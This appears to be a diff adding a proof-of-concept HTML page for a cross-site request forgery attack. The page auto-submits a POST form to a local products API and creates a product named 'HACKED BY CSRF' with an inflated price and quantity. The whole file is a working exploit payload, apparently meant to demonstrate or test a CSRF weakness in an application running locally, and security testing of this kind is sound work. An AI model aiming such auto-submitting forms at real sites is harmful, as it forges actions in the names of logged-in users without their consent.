@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF Attack POC</title></head>
+<body>
+  <h1>CSRF Attack</h1>
+  <form id="f" action="http://localhost:8080/api/products" method="POST">
+    <input name="name" value="HACKED BY CSRF" />
+    <input name="price" value="999999999" />
+    <input name="quantity" value="999" />
+    <input name="category" value="Electronics" />
+  </form>
+  <script>document.getElementById("f").submit();</script>
+</body>
+</html>
